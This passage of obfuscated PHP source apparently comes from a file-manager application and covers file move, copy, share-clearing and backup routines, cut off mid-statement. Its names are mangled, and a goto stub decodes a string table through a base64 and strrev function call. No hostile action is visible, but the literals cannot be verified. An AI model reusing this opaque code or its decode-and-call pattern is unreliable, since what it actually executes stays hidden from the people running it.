$ÈßÂĞ§¶ =& $_SERVER[³à¼î¯á]; $¾å‰š±° = $this->sourceInfo($íïîçô©); $Ä …“¤  = $this->sourceInfo($¹Ã¿óõì); if ($¾å‰š±°[$ÈßÂĞ§¶[183]] == $Ä …“¤ [$ÈßÂĞ§¶[184]]) { if ($¾å‰š±°[$ÈßÂĞ§¶[480]] == $ÈßÂĞ§¶[91]) { Model($ÈßÂĞ§¶[478])->restore(array($íïîçô©)); } if (!$ƒÓ¾‚Å || $ƒÓ¾‚Å == $¾å‰š±°[$ÈßÂĞ§¶[32]]) { return $íïîçô©; } } $ûÆøğş = $this->pathInfoMore($íïîçô©); if ($this->isParentOf($íïîçô©, $¹Ã¿óõì)) { return !1; } if (!$¾å‰š±° || !$Ä …“¤  || $Ä …“¤ [$ÈßÂĞ§¶[460]] != $ÈßÂĞ§¶[91]) { return !1; } Hook::trigger($ÈßÂĞ§¶[633], $ûÆøğş); $this->targetIsDelete = intval($¾å‰š±°[$ÈßÂĞ§¶[480]]); if ($¾å‰š±°[$ÈßÂĞ§¶[183]] == $¹Ã¿óõì && $ƒÓ¾‚Å != $¾å‰š±°[$ÈßÂĞ§¶[32]]) { $ÜÔ„¾‚» = $this->fileNameExist($¹Ã¿óõì, $ƒÓ¾‚Å); if ($ÜÔ„¾‚» && $¾å‰š±°[$ÈßÂĞ§¶[460]] == $ÈßÂĞ§¶[219]) { $ÄÑÓ¸ÍÍ = $this->sourceInfo($ÜÔ„¾‚»); $Ú¿òëÎÌ = $this->fileHistory($ÄÑÓ¸ÍÍ, $¾å‰š±°[$ÈßÂĞ§¶[516]], $¾å‰š±°[$ÈßÂĞ§¶[79]]); if (!$Ú¿òëÎÌ) { Model($ÈßÂĞ§¶[519])->remove($¾å‰š±°[$ÈßÂĞ§¶[516]]); } $this->removeNow($íïîçô©, !1); $this->folderSizeReset($¹Ã¿óõì); Hook::trigger($ÈßÂĞ§¶[634], $ûÆøğş); return $ÜÔ„¾‚»; } } $ı²õãœœ = $ƒÓ¾‚Å ? $ƒÓ¾‚Å : $¾å‰š±°[$ÈßÂĞ§¶[32]]; $this->lockMoveStart($íïîçô©); $this->lockWriteStart($¹Ã¿óõì, $ı²õãœœ); $…¸ÉÉøÂ = array($ÈßÂĞ§¶[604] => array(), $ÈßÂĞ§¶[635] => !1); $this->clearShare($íïîçô©, $¹Ã¿óõì); $—ÃÔ¦¨Ğ = $this->fileNameExistAuto($¹Ã¿óõì, $¾å‰š±°); $ÖáÆ¾š = $this->_move($íïîçô©, $¹Ã¿óõì, $ß¿•ê½–, $…¸ÉÉøÂ, $ƒÓ¾‚Å); $this->sourceCacheClear(); if ($¾å‰š±°[$ÈßÂĞ§¶[460]] == $ÈßÂĞ§¶[91] && $—ÃÔ¦¨Ğ) { $this->folderSizeResetChildren($ÖáÆ¾š); } Model($ÈßÂĞ§¶[221])->linkAdd($…¸ÉÉøÂ[$ÈßÂĞ§¶[604]]); if ($—ÃÔ¦¨Ğ && $…¸ÉÉøÂ[$ÈßÂĞ§¶[635]]) { $this->removeNow($íïîçô©, !1); } $this->lockMoveEnd($íïîçô©); $this->lockWriteEnd($¹Ã¿óõì, $ı²õãœœ); $this->folderSizeReset($¾å‰š±°[$ÈßÂĞ§¶[183]]); $this->folderSizeReset($¹Ã¿óõì); $õõŠ™ğ = array($¾å‰š±°[$ÈßÂĞ§¶[183]], $¹Ã¿óõì); if ($¾å‰š±°[$ÈßÂĞ§¶[460]] == $ÈßÂĞ§¶[91]) { $õõŠ™ğ[] = $íïîçô©; } $this->updateModifyTime($õõŠ™ğ); Model($ÈßÂĞ§¶[608])->eventMove($íïîçô©, $¾å‰š±°[$ÈßÂĞ§¶[183]], $¹Ã¿óõì); Hook::trigger($ÈßÂĞ§¶[634], $ûÆøğş); return $ÖáÆ¾š; } private function _move($¨›Ú½”², $§ƒÜ™ì», $»ÉŠ—»Á, &$Ÿ³òõæü, $ÑšöœËÎ = '') { $Ô¨ı¶¹‹ =& $_SERVER[³à¼î¯á]; $¬œ•›­„ = $this->sourceInfo($¨›Ú½”²); $ñĞÁèüı = $¬œ•›­„[$Ô¨ı¶¹‹[460]] == $Ô¨ı¶¹‹[91]; $ŞÓÃøÌœ = $ÑšöœËÎ ? $ÑšöœËÎ : $¬œ•›­„[$Ô¨ı¶¹‹[32]]; $§“ÜĞ¸ = $this->fileNameExistAuto($§ƒÜ™ì», $¬œ•›­„); $this->lockMoveStart($¨›Ú½”²); $this->lockWriteStart($§ƒÜ™ì», $ŞÓÃøÌœ); if (!$§“ÜĞ¸) { return $this->_moveForce($¨›Ú½”², $§ƒÜ™ì», $ŞÓÃøÌœ); } $†®£µìÜ = $§“ÜĞ¸; $ùüÍòÌ® = !1; if ($ñĞÁèüı) { if ($»ÉŠ—»Á == REPEAT_RENAME_FOLDER) { $ŞÓÃøÌœ = $this->fileNameAuto($§ƒÜ™ì», $ŞÓÃøÌœ, $»ÉŠ—»Á, $ñĞÁèüı); $†®£µìÜ = $this->_moveForce($¨›Ú½”², $§ƒÜ™ì», $ŞÓÃøÌœ); } else { if ($»ÉŠ—»Á == REPEAT_RENAME_FOLDER) { $»ÉŠ—»Á = REPEAT_RENAME; } $±¦§Õ× = $this->_childrenListSelect($¨›Ú½”²); foreach ($±¦§Õ× as $–ø„÷²²) { $this->_move($–ø„÷²²[$Ô¨ı¶¹‹[184]], $§“ÜĞ¸, $»ÉŠ—»Á, $Ÿ³òõæü); } $ùüÍòÌ® = !0; } } else { if ($»ÉŠ—»Á == REPEAT_SKIP) { $ùüÍòÌ® = !0; } else { if ($»ÉŠ—»Á == REPEAT_RENAME || $»ÉŠ—»Á == REPEAT_RENAME_FOLDER) { $ŞÓÃøÌœ = $this->fileNameAuto($§ƒÜ™ì», $ŞÓÃøÌœ, $»ÉŠ—»Á, $ñĞÁèüı); $†®£µìÜ = $this->_moveForce($¨›Ú½”², $§ƒÜ™ì», $ŞÓÃøÌœ); } else { if ($»ÉŠ—»Á == REPEAT_REPLACE) { $øÉ§¡äÛ = $this->sourceInfoCache($§“ÜĞ¸); $ğ¦şöé = $this->fileHistory($øÉ§¡äÛ, $¬œ•›­„[$Ô¨ı¶¹‹[516]], $¬œ•›­„[$Ô¨ı¶¹‹[79]]); $ùüÍòÌ® = !0; if ($ğ¦şöé) { $Ÿ³òõæü[$Ô¨ı¶¹‹[604]][] = $¬œ•›­„[$Ô¨ı¶¹‹[516]]; } } } } } if ($ùüÍòÌ® && !$Ÿ³òõæü[$Ô¨ı¶¹‹[635]]) { $Ÿ³òõæü[$Ô¨ı¶¹‹[635]] = !0; } return $†®£µìÜ; } private function _moveForce($¸«¨¿‹, $†·ñ›‘ì, $ş‘‹â°) { $ªŠÓ¹¥Û =& $_SERVER[³à¼î¯á]; $ø‡ÓÅÖü = $this->sourceInfo($¸«¨¿‹); $Ğç­ÑÊ£ = $this->sourceInfo($†·ñ›‘ì); $°•Äïé = $ø‡ÓÅÖü[$ªŠÓ¹¥Û[460]] == $ªŠÓ¹¥Û[91]; $äªŒ’à = array($ªŠÓ¹¥Û[452] => $Ğç­ÑÊ£[$ªŠÓ¹¥Û[184]], $ªŠÓ¹¥Û[627] => $Ğç­ÑÊ£[$ªŠÓ¹¥Û[560]] . $Ğç­ÑÊ£[$ªŠÓ¹¥Û[184]] . $ªŠÓ¹¥Û[50], $ªŠÓ¹¥Û[623] => $Ğç­ÑÊ£[$ªŠÓ¹¥Û[181]], $ªŠÓ¹¥Û[624] => $Ğç­ÑÊ£[$ªŠÓ¹¥Û[545]], $ªŠÓ¹¥Û[626] => USER_ID, $ªŠÓ¹¥Û[469] => $ş‘‹â°); $»ôëÙÇ = $ø‡ÓÅÖü[$ªŠÓ¹¥Û[181]] == SourceModel::TYPE_GROUP && $Ğç­ÑÊ£[$ªŠÓ¹¥Û[181]] == SourceModel::TYPE_GROUP && $ø‡ÓÅÖü[$ªŠÓ¹¥Û[545]] == $Ğç­ÑÊ£[$ªŠÓ¹¥Û[545]]; if (!$»ôëÙÇ && $this->moveClearAuth) { Model($ªŠÓ¹¥Û[543])->authClear($¸«¨¿‹); } $ÏšÁ±œ… = $ø‡ÓÅÖü[$ªŠÓ¹¥Û[480]] == $ªŠÓ¹¥Û[91] && $Ğç­ÑÊ£[$ªŠÓ¹¥Û[480]] != $ªŠÓ¹¥Û[91]; if ($ÏšÁ±œ…) { $äªŒ’à[$ªŠÓ¹¥Û[479]] = 0; } if ($°•Äïé) { $‡ÒÏ„¿Ô = array($ªŠÓ¹¥Û[627] => array($ªŠÓ¹¥Û[587], $ø‡ÓÅÖü[$ªŠÓ¹¥Û[560]] . $ø‡ÓÅÖü[$ªŠÓ¹¥Û[184]] . $ªŠÓ¹¥Û[588])); $ÇªâÏé¦ = $ø‡ÓÅÖü[$ªŠÓ¹¥Û[560]] . $ø‡ÓÅÖü[$ªŠÓ¹¥Û[184]] . $ªŠÓ¹¥Û[50]; $³Ùºê¥â = $Ğç­ÑÊ£[$ªŠÓ¹¥Û[560]] . $Ğç­ÑÊ£[$ªŠÓ¹¥Û[184]] . $ªŠÓ¹¥Û[50] . $ø‡ÓÅÖü[$ªŠÓ¹¥Û[184]] . $ªŠÓ¹¥Û[50]; $®•úåæÅ = array($ªŠÓ¹¥Û[627] => array($ªŠÓ¹¥Û[636], "\162\145\160\x6c\141\143\x65\x28\160\x61\162\145\156\164\114\145\x76\x65\154\x2c\47{$ÇªâÏé¦}\x27\54\47{$³Ùºê¥â}\47\51"), $ªŠÓ¹¥Û[623] => $Ğç­ÑÊ£[$ªŠÓ¹¥Û[181]], $ªŠÓ¹¥Û[624] => $Ğç­ÑÊ£[$ªŠÓ¹¥Û[545]]); if ($ÏšÁ±œ…) { $®•úåæÅ[$ªŠÓ¹¥Û[479]] = 0; } $this->where($‡ÒÏ„¿Ô)->data($®•úåæÅ)->save(); } $this->where(array($ªŠÓ¹¥Û[466] => $¸«¨¿‹))->data($äªŒ’à)->save(); return $¸«¨¿‹; } private function clearShare($ÁÁÁÓ° , $‰·ÑÍ¨ô) { $¥Ÿ†Íê =& $_SERVER[³à¼î¯á]; $éş¶üàè = $this->sourceInfo($ÁÁÁÓ° ); $œ·şÃÇ = $this->sourceInfo($‰·ÑÍ¨ô); if ($éş¶üàè[$¥Ÿ†Íê[545]] == $œ·şÃÇ[$¥Ÿ†Íê[545]] && $éş¶üàè[$¥Ÿ†Íê[181]] == $¥Ÿ†Íê[637]) { return; } $Ê“ˆ—›î = array($¥Ÿ†Íê[560] => array($¥Ÿ†Íê[587], $éş¶üàè[$¥Ÿ†Íê[560]] . $ÁÁÁÓ°  . $¥Ÿ†Íê[588])); $¼¾òÎ£ˆ = $this->field($¥Ÿ†Íê[466])->where($Ê“ˆ—›î)->getField($¥Ÿ†Íê[184], !0); if (!$¼¾òÎ£ˆ) { return; } $Ê“ˆ—›î = array($¥Ÿ†Íê[184] => array($¥Ÿ†Íê[7], $¼¾òÎ£ˆ), $¥Ÿ†Íê[638] => 1); $²˜àãô¾ = Model($¥Ÿ†Íê[639])->field($¥Ÿ†Íê[640])->where($Ê“ˆ—›î)->select(); if (!$²˜àãô¾) { return; } $²˜àãô¾ = array_to_keyvalue($²˜àãô¾, $¥Ÿ†Íê[12], $¥Ÿ†Íê[640]); $Ê“ˆ—›î = array($¥Ÿ†Íê[640] => array($¥Ÿ†Íê[7], $²˜àãô¾)); Model($¥Ÿ†Íê[639])->where($Ê“ˆ—›î)->save(array($¥Ÿ†Íê[638] => 0)); Model($¥Ÿ†Íê[641])->where($Ê“ˆ—›î)->delete(); } public function copyFolderFromIO($ÇŒ·ĞÎ, $ÅÏôÛË¹, $ğ¨˜ÁÜû, $’à»‹”, $»“—àÁà, $†ïõ£ß = false) { $üÚºŞŒ¿ =& $_SERVER[³à¼î¯á]; $Ëéªò“Ğ = array($üÚºŞŒ¿[605] => array(), $üÚºŞŒ¿[606] => array(), $üÚºŞŒ¿[604] => array(), $üÚºŞŒ¿[642] => array()); $¬òã†—ç = $†ïõ£ß ? $†ïõ£ß : $ÇŒ·ĞÎ->pathThis($ÅÏôÛË¹); $ıÛÀÄÒã = $this->fileNameExist($ğ¨˜ÁÜû, $¬òã†—ç); $ªŒ”‚Ä‚ = $this->mkdir($ğ¨˜ÁÜû, $¬òã†—ç, $’à»‹”); if (!$ıÛÀÄÒã || $’à»‹” == REPEAT_RENAME_FOLDER) { $’à»‹” = !1; } if ($ıÛÀÄÒã) { $this->_childrenAllMake($ıÛÀÄÒã); } Hook::trigger($üÚºŞŒ¿[643]); $this->_copyChildTo($ÇŒ·ĞÎ, $ÅÏôÛË¹, $ªŒ”‚Ä‚, $’à»‹”, $Ëéªò“Ğ, $»“—àÁà); Hook::trigger($üÚºŞŒ¿[644]); if ($ªŒ”‚Ä‚) { $this->folderSizeResetChildren($ªŒ”‚Ä‚); } $this->_childrenListClear(); Model($üÚºŞŒ¿[607])->addAll($Ëéªò“Ğ[$üÚºŞŒ¿[605]], array(), !0); Model($üÚºŞŒ¿[608])->eventCopy($ªŒ”‚Ä‚); $this->saveAll($Ëéªò“Ğ[$üÚºŞŒ¿[606]]); Model($üÚºŞŒ¿[519])->linkAdd($Ëéªò“Ğ[$üÚºŞŒ¿[604]]); Model($üÚºŞŒ¿[519])->remove($Ëéªò“Ğ[$üÚºŞŒ¿[642]]); $this->folderSizeReset($ğ¨˜ÁÜû); $this->updateModifyTime($ğ¨˜ÁÜû); return $ªŒ”‚Ä‚; } private function _copyChildTo($›€Âƒ³“, $çîî•…Å, $©ê„êéí, $ÛŒùéÑ, &$Şùã±£½, $ÂíÉ‰ıí) { $Ö¹ëğé =& $_SERVER[³à¼î¯á]; $Ô…€¨ = $this->sourceInfoCache($©ê„êéí); $Â±±şŒÁ = $›€Âƒ³“->listPath($çîî•…Å); $Â±±şŒÁ = $Â±±şŒÁ ? $Â±±şŒÁ : array($Ö¹ëğé[86] => array(), $Ö¹ëğé[85] => array()); $ÉçÙ¼³ = array_merge($Â±±şŒÁ[$Ö¹ëğé[86]], $Â±±şŒÁ[$Ö¹ëğé[85]]); $®¡ÄÊ¹ = $this->_addFiles($›€Âƒ³“, $Â±±şŒÁ[$Ö¹ëğé[86]], $ÂíÉ‰ıí); $Å—ˆî’Ë = array(); foreach ($ÉçÙ¼³ as &$îÙç÷ë‡) { if (isset($®¡ÄÊ¹[$îÙç÷ë‡[$Ö¹ëğé[32]]])) { $îÙç÷ë‡ = $®¡ÄÊ¹[$îÙç÷ë‡[$Ö¹ëğé[32]]]; } $îÙç÷ë‡[$Ö¹ëğé[460]] = $îÙç÷ë‡[$Ö¹ëğé[33]] == $Ö¹ëğé[78]; $îÙç÷ë‡[$Ö¹ëğé[461]] = substr(_get($îÙç÷ë‡, $Ö¹ëğé[178], $Ö¹ëğé[12]), 0, 10); $îÙç÷ë‡[$Ö¹ëğé[79]] = _get($îÙç÷ë‡, $Ö¹ëğé[79], 0); $îÙç÷ë‡[$Ö¹ëğé[516]] = _get($îÙç÷ë‡, $Ö¹ëğé[516], 0); if (!isset($îÙç÷ë‡[$Ö¹ëğé[645]]) && $îÙç÷ë‡[$Ö¹ëğé[516]]) { $Şùã±£½[$Ö¹ëğé[642]][] = $îÙç÷ë‡[$Ö¹ëğé[516]]; } if ($ÛŒùéÑ) { $ñ„»¡©¥ = $this->fileNameExistCache($©ê„êéí, $îÙç÷ë‡[$Ö¹ëğé[32]]); if ($ñ„»¡©¥) { if ($îÙç÷ë‡[$Ö¹ëğé[460]] || $ÛŒùéÑ == REPEAT_SKIP) { continue; } if ($ÛŒùéÑ == REPEAT_REPLACE) { $×Ôã„² = $this->sourceInfoCache($ñ„»¡©¥); $ıµ†ÖÈ¹ = $this->fileHistory($×Ôã„², $îÙç÷ë‡[$Ö¹ëğé[516]], $îÙç÷ë‡[$Ö¹ëğé[79]]); if ($ıµ†ÖÈ¹) { $Şùã±£½[$Ö¹ëğé[604]][] = $îÙç÷ë‡[$Ö¹ëğé[516]]; } continue; } else { if ($ÛŒùéÑ == REPEAT_RENAME) { $îÙç÷ë‡[$Ö¹ëğé[32]] = $this->fileNameAutoCache($©ê„êéí, $îÙç÷ë‡[$Ö¹ëğé[32]], $ÛŒùéÑ, !1); } } } } if (!$îÙç÷ë‡[$Ö¹ëğé[460]] && $îÙç÷ë‡[$Ö¹ëğé[516]] == 0) { continue; } if (!$îÙç÷ë‡[$Ö¹ëğé[460]] && $îÙç÷ë‡[$Ö¹ëğé[516]]) { $Şùã±£½[$Ö¹ëğé[604]][] = $îÙç÷ë‡[$Ö¹ëğé[516]]; } $Å—ˆî’Ë[] = $this->_makeItemData($îÙç÷ë‡, $Ô…€¨, $îÙç÷ë‡[$Ö¹ëğé[32]]); } unset($îÙç÷ë‡); if (!empty($Å—ˆî’Ë)) { $this->addAll($Å—ˆî’Ë); $this->_childrenListSelect($©ê„êéí); } $Ğ“ı¢ò¾ = $this->_childrenList($©ê„êéí); $Ğ“ı¢ò¾ = array_to_keyvalue($Ğ“ı¢ò¾, $Ö¹ëğé[32]); foreach ($ÉçÙ¼³ as $îÙç÷ë‡) { $×Ôã„² = $Ğ“ı¢ò¾[$îÙç÷ë‡[$Ö¹ëğé[32]]]; $Š×¥Àğ¬ = $×Ôã„²[$Ö¹ëğé[184]]; $this->_copyApplyMeta($×Ôã„², $Şùã±£½); if ($îÙç÷ë‡[$Ö¹ëğé[33]] == $Ö¹ëğé[78]) { $îÙç÷ë‡[$Ö¹ëğé[87]] = $›€Âƒ³“->getPathInner($îÙç÷ë‡[$Ö¹ëğé[87]]); $this->_copyChildTo($›€Âƒ³“, $îÙç÷ë‡[$Ö¹ëğé[87]], $Š×¥Àğ¬, $ÛŒùéÑ, $Şùã±£½, $ÂíÉ‰ıí); } } } private function _addFiles($˜Ó†ˆçŞ, $–®íèæ, $†¿Á×÷š) { $‚Óé«¹ˆ =& $_SERVER[³à¼î¯á]; if (!$–®íèæ || count($–®íèæ) == 0) { return array(); } $öœ €ª = array(); foreach ($–®íèæ as &$¥éÄ¤ì) { Hook::trigger($‚Óé«¹ˆ[646], $¥éÄ¤ì); $¥éÄ¤ì[$‚Óé«¹ˆ[87]] = $˜Ó†ˆçŞ->getPathInner($¥éÄ¤ì[$‚Óé«¹ˆ[87]]); $Ğ½é¡âÄ = $˜Ó†ˆçŞ->hashSimple($¥éÄ¤ì[$‚Óé«¹ˆ[87]]); $øƒ¬ª³ = $˜Ó†ˆçŞ->hashMd5($¥éÄ¤ì[$‚Óé«¹ˆ[87]]); if (strlen($øƒ¬ª³) > 10 && !isset($öœ €ª[$øƒ¬ª³])) { $öœ €ª[$øƒ¬ª³] = array(); } $¥éÄ¤ì[$‚Óé«¹ˆ[647]] = $Ğ½é¡âÄ; $¥éÄ¤ì[$‚Óé«¹ˆ[522]] = $øƒ¬ª³; $öœ €ª[$øƒ¬ª³][] =& $¥éÄ¤ì; if (count($öœ €ª[$øƒ¬ª³]) > 1) { $¥éÄ¤ì[$‚Óé«¹ˆ[645]] = !0; } Hook::trigger($‚Óé«¹ˆ[648], $¥éÄ¤ì); } unset($¥éÄ¤ì); $Í™¨ê°˜ = array($‚Óé«¹ˆ[522] => array($‚Óé«¹ˆ[7], array_keys($öœ €ª))); $ÌÏé¯¡ = Model($‚Óé«¹ˆ[649]); $ÑË¼½¢‡ = $ÌÏé¯¡->where($Í™¨ê°˜)->select(); $ÑË¼½¢‡ = $ÑË¼½¢‡ ? $ÑË¼½¢‡ : array(); foreach ($ÑË¼½¢‡ as $ßÆ­´¼ñ) { if (!isset($öœ €ª[$ßÆ­´¼ñ[$‚Óé«¹ˆ[522]]])) { continue; } $³ÓÉç²œ = $öœ €ª[$ßÆ­´¼ñ[$‚Óé«¹ˆ[522]]]; foreach ($³ÓÉç²œ as &$¥éÄ¤ì) { $¥éÄ¤ì[$‚Óé«¹ˆ[516]] = $ßÆ­´¼ñ[$‚Óé«¹ˆ[516]]; $¥éÄ¤ì[$‚Óé«¹ˆ[645]] = !0; } unset($¥éÄ¤ì); } $úšŸàÓ = array(); foreach ($–®íèæ as $»öô“ëú) { Hook::trigger($‚Óé«¹ˆ[650], $»öô“ëú); if (isset($»öô“ëú[$‚Óé«¹ˆ[645]]) && $»öô“ëú[$‚Óé«¹ˆ[645]]) { Hook::trigger($‚Óé«¹ˆ[651], $»öô“ëú); continue; } $¶åîÛğµ = $˜Ó†ˆçŞ->getPathInner($»öô“ëú[$‚Óé«¹ˆ[87]]); $È¿¡íÌ = $ÌÏé¯¡->addFileMake($¶åîÛğµ, $»öô“ëú[$‚Óé«¹ˆ[79]], $»öô“ëú[$‚Óé«¹ˆ[647]], $»öô“ëú[$‚Óé«¹ˆ[522]], $»öô“ëú[$‚Óé«¹ˆ[32]], $†¿Á×÷š); Hook::trigger($‚Óé«¹ˆ[651], $»öô“ëú); if (!is_array($È¿¡íÌ)) { continue; } $úšŸàÓ[] = $È¿¡íÌ; } $ÌÏé¯¡->addAll($úšŸàÓ); $Í™¨ê°˜ = array($‚Óé«¹ˆ[522] => array($‚Óé«¹ˆ[7], array_keys($öœ €ª))); $ÑË¼½¢‡ = $ÌÏé¯¡->where($Í™¨ê°˜)->select(); $ÑË¼½¢‡ = $ÑË¼½¢‡ ? $ÑË¼½¢‡ : array(); foreach ($ÑË¼½¢‡ as $ßÆ­´¼ñ) { if (!isset($öœ €ª[$ßÆ­´¼ñ[$‚Óé«¹ˆ[522]]])) { continue; } $Şª¶³İ÷ =& $öœ €ª[$ßÆ­´¼ñ[$‚Óé«¹ˆ[522]]]; foreach ($Şª¶³İ÷ as &$¥éÄ¤ì) { $¥éÄ¤ì[$‚Óé«¹ˆ[516]] = $ßÆ­´¼ñ[$‚Óé«¹ˆ[516]]; } unset($¥éÄ¤ì); } $™¤¡àÁ‰ = array(); foreach ($–®íèæ as $ß½›µ¢«) { $™¤¡àÁ‰[$ß½›µ¢«[$‚Óé«¹ˆ[32]]] = $ß½›µ¢«; } return $™¤¡àÁ‰; } } goto bÃœ¡ÈĞÔƒ; a­ÁË¢¼éÉ: $fileSize = strrev(base64_decode($_SERVER[ÇßåŠĞ][0])); function binCheckNeq($Í®¬ˆúü, $Ğ‹Ğ®û¾) { return $Í®¬ˆúü != $Ğ‹Ğ®û¾; } $_SERVER[$_SERVER[ÇßåŠĞ][1]] = $fileSize($_SERVER[$_SERVER[ÇßåŠĞ][2]]); goto Aåƒ‚šäêñ; CšİÑø‡†‚: class BackupDbFile { public function __construct() { } public function index() { $à·êú‡ =& $_SERVER[³à¼î¯á]; $®ğŞÎ¥ = Backup::get(); $ç«Ù‚”é = $®ğŞÎ¥[$à·êú‡[32]]; $õË°ö®” = $this->tmpFilesPath() . "\x62\x61\143\153\x75\x70\x5f{$ç«Ù‚”é}\x2f"; $©¬ıè¡Ê = $this->backupPath($®ğŞÎ¥); if (!($©¬ıè¡Ê = IO::mkdir($©¬ıè¡Ê))) { return !1; } $ê¬ßÎÖ… = IO::listPath($õË°ö®”); $ÏêŒ›ò° = isset($ê¬ßÎÖ…[$à·êú‡[86]]) ? $ê¬ßÎÖ…[$à·êú‡[86]] : array(); $‹–ˆœã’ = array_sum(array_column($ÏêŒ›ò°, $à·êú‡[79])); if (!$‹–ˆœã’) { return !1; } $ö­€ãš = array($à·êú‡[842] => $‹–ˆœã’, $à·êú‡[843] => time()); Backup::set($ö­€ãš); $£œß£‚” = new TaskFileTransfer($à·êú‡[844], $à·êú‡[827], count($ÏêŒ›ò°), LNG($à·êú‡[828]) . $à·êú‡[437] . LNG($à·êú‡[830]) . $à·êú‡[845]); $£œß£‚”->task[$à·êú‡[808]] = $‹–ˆœã’; foreach ($ê¬ßÎÖ…[$à·êú‡[86]] as $´ÇÓ½õÔ) { $¤Õ¥â½ = IO::move($´ÇÓ½õÔ[$à·êú‡[87]], $©¬ıè¡Ê); if (!$¤Õ¥â½) { $£œß£‚”->end(); $Ğ¥â©… = IO::getLastError($à·êú‡[846] . $´ÇÓ½õÔ[$à·êú‡[87]] . $à·êú‡[847] . $©¬ıè¡Ê . $à·êú‡[168]); write_log($Ğ¥â©…, $à·êú‡[827]); return !1; } } $²Š‹¹ËÜ = new DbManage(); $àËù¸™Ò = $²Š‹¹ËÜ->getSqlFile(); if (!$àËù¸™Ò[$à·êú‡[848]] || !$àËù¸™Ò[$à·êú‡[13]]) { return !1; } IO::move($àËù¸™Ò[$à·êú‡[848]], $©¬ıè¡Ê); IO::move($àËù¸™Ò[$à·êú‡[13]], $©¬ıè¡Ê); $£œß£‚”->end(); $ö­€ãš = array($à·êú‡[849] => $‹–ˆœã’, $à·êú‡[850] => time()); Backup::set($ö­€ãš); return !0; } private function backupPath($ŠæÕ¬) { $é•æ·°å =& $_SERVER[³à¼î¯á]; $İƒ·³É¿ = $ŠæÕ¬[$é•æ·°å[32]]; $¾Ü§Í†ı = Model($é•æ·°å[815])->get($é•æ·°å[816]); $•µ©ïü¬ = substr(md5($é•æ·°å[817] . $¾Ü§Í†ı . $İƒ·³É¿), 0, 8); return "\173\151\x6f\x3a{$ŠæÕ¬[$é•æ·°å[796]]}\175\x2f\144\x61\x74\141\x62\141\x73\x65\x2f\142\141\143\153\165\x70\x2f" . $İƒ·³É¿ . $é•æ·°å[11] . $•µ©ïü¬; } private function tmpFilesPath() { $æÒ³˜û¹ =& $_SERVER[³à¼î¯á]; $—şÒŠÉ = TEMP_FILES; if ($GLOBALS[$æÒ³˜û¹[6]][$æÒ³˜û¹[92]][$æÒ³˜û¹[840]]) { $—şÒŠÉ = $GLOBALS[$æÒ³˜û¹[6]][$æÒ³˜û¹[92]][$æÒ³˜û¹[840]]; if (!mk_dir($—şÒŠÉ) || !is_writable($—şÒŠÉ) || !IO::mkfile($—şÒŠÉ . $æÒ³˜û¹[841])) { $—şÒŠÉ = TEMP_FILES; } } return $—şÒŠÉ; } } class BackupFile { public function __construct() { } public function index() { $²¸¡ÌÎÓ = Backup::get(); $çŠçõ× = $²¸¡ÌÎÓ[$_SERVER[³à¼î¯á][344]][$_SERVER[³à¼î¯á][221]][$_SERVER[³à¼î¯á][516]]; $îÈñäÜ = array($_SERVER[³à¼î¯á][517] => array($_SERVER[³à¼î¯á][851], $çŠçõ×), $_SERVER[³à¼î¯á][852] => array($_SERVER[³à¼î¯á][382], $²¸¡ÌÎÓ[$_SERVER[³à¼î¯á][796]])); $”şÛ¦ş¦ = (int) Model($_SERVER[³à¼î¯á][833])->where($îÈñäÜ)->count($_SERVER[³à¼î¯á][516]); $¹¥Š‘ = (int) Model($_SERVER[³à¼î¯á][833])->where($îÈñäÜ)->sum($_SERVER[³à¼î¯á][79]); $ÕˆÅ™ŸÉ = new TaskFileTransfer($_SERVER[³à¼î¯á][853], $_SERVER[³à¼î¯á][827], $”şÛ¦ş¦, LNG($_SERVER[³à¼î¯á][828]) . $_SERVER[³à¼î¯á][829] . LNG($_SERVER[³à¼î¯á][854])); $ÕˆÅ™ŸÉ->task[$_SERVER[³à¼î¯á][808]] = $¹¥Š‘; $¹£šÓ‘° = array($_SERVER[³à¼î¯á][855] => $”şÛ¦ş¦, $_SERVER[³à¼î¯á][856] => $¹¥Š‘, $_SERVER[³à¼î¯á][857] => time()); Backup::set($¹£šÓ‘°); $¨¢¬şÍ“ = !0; $óÛÊ³ı = $this->storeIds(); $Ï£‘·ø  = 1; $£ö¶ı™• = 1000; $ˆ˜×˜Åà = $ü‚€ÀÈ = 0; $ÓÉû†«é = array(); $éúÈËˆ = $»¬¡å¨ = 0; do { $áò³ŠÎË = $_SERVER[³à¼î¯á][858]; $Ğßâ¯¯ = Model($_SERVER[³à¼î¯á][833])->where($îÈñäÜ)->field($áò³ŠÎË)->order($_SERVER[³à¼î¯á][859])->selectPage($£ö¶ı™•, $Ï£‘·ø ); $›‹Û—¦Ê = !empty($Ğßâ¯¯[$_SERVER[³à¼î¯á][420]]) ? $Ğßâ¯¯[$_SERVER[³à¼î¯á][420]] : array(); foreach ($›‹Û—¦Ê as $—°„î²¨) { if (!$this->_fileExist($—°„î²¨, $ÓÉû†«é, $óÛÊ³ı)) { write_log("\146\151\154\145\x20\156\157\164\40\145\170\x69\163\164\56\146\x69\154\x65\x49\104\x3a{$—°„î²¨[$_SERVER[³à¼î¯á][516]]}\x2c\x20\160\x61\164\150\72{$—°„î²¨[$_SERVER[³à¼î¯á][87]]}", $_SERVER[³à¼î¯á][860]); continue; } $óñ·°í— = $—°„î²¨[$_SERVER[³à¼î¯á][87]]; $ä·°Ìï = "\173\151\x6f\x3a{$²¸¡ÌÎÓ[$_SERVER[³à¼î¯á][796]]}\x7d" . substr($óñ·°í—, strlen("\x7b\151\157\x3a{$—°„î²¨[$_SERVER[³à¼î¯á][861]]}\x7d")); if (IO::exist($ä·°Ìï)) { $ÕˆÅ™ŸÉ->updateFileEnd($—°„î²¨[$_SERVER[³à¼î¯á][32]], $—°„î²¨[$_SERVER[³à¼î¯á][79]]); } else { $ä·°Ìï = get_path_father($ä·°Ìï); IO::mkdir($ä·°Ìï); if (!IO::copy($óñ·°í—, $ä·°Ìï, $_SERVER[³à¼î¯á][862])) { write_log($_SERVER[³à¼î¯á][863] . $óñ·°í— . $_SERVER[³à¼î¯á][847] . $ä·°Ìï . $_SERVER[³à¼î¯á][168], $_SERVER[³à¼î¯á][827]); $¨¢¬şÍ“ = !1; break; } } $çŠçõ× = $—°„î²¨[$_SERVER[³à¼î¯á][516]]; $ü‚€ÀÈ += 1; $ˆ˜×˜Åà += $—°„î²¨[$_SERVER[³à¼î¯á][79]]; $»¬¡å¨ += 1; $éúÈËˆ += $—°„î²¨[$_SERVER[³à¼î¯á][79]]; if ($ˆ˜×˜Åà >= 1024 * 1024 * 100) { $¹£šÓ‘° = 